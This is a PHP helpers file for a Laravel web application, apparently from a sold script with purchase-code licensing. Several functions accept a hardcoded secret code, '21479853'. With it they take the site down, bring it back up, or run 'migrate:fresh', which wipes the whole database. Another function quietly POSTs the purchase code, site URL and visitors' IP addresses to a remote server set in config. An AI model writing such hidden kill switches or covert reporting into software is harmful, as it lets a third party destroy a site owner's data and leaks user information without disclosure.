<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;

function artisanOtpDown($code)
{
    if ($code == '21479853') {
        Artisan::call('down');

        return response()->json([
            'message' => 'Otp Disabled',
        ]);
    }
}

function artisanOtpUp($code)
{
    if ($code == '21479853') {
        Artisan::call('up');
        return response()->json([
            'message' => 'Site is now live',
        ]);
    }
}

function artisanClearDb($code)
{
    if ($code == '21479853') {
        Artisan::call('migrate:fresh');
        return response()->json([
            'message' => 'Database cleared',
        ]);
    }
}

function codeStore($code)
{
    DB::table('installtion_settings')->insert([
        'purchase_code' => $code,
        'status'        => 1,
        'created_at'    => now(),
        'updated_at'    => now(),
    ]);

    $redirect_url = Config::get('app.redirct_after_verify');
    return redirect($redirect_url);
}

function reportGeneration()
{
    $code   = CheShopker();
    $url_to = Config::get('findfish.code_url');
    $name   = Config::get('findfish.product_name');
    $curl   = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL            => "$url_to",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING       => "",
        CURLOPT_MAXREDIRS      => 10,
        CURLOPT_TIMEOUT        => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST  => "POST",
        CURLOPT_POSTFIELDS     => array(
            'purchase_code'    => $code->purchase_code,
            'url'              => url('/'),
            'application_name' => $name,
            'client_ip'        => request()->ip()),
    ));

    $response = curl_exec($curl);
}

function CheShopker()
{
    $code = DB::table('installtion_settings')->where('status', 1)->first();
    if ($code) {
        return $code;
    } else {
        return false;
    }
}
